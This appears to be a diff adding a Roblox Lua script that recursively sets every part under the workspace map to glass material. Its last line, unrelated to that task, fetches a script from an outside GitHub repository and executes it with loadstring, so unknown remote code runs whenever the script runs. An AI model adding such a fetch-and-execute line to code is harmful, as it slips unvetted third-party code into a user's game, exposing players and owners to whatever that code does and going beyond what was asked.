@@ -1,0 +1,15 @@
+local function setMaterial(part)
+    part.Material = Enum.Material.Glass
+end
+
+local function applyMaterialToChildren(parent)
+    for _, child in ipairs(parent:GetChildren()) do
+        if child:IsA("BasePart") then
+            setMaterial(child)
+        end
+        applyMaterialToChildren(child)
+    end
+end
+
+applyMaterialToChildren(game.Workspace.Map)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pwrsk/tsballinone/main/tsballinone"))()
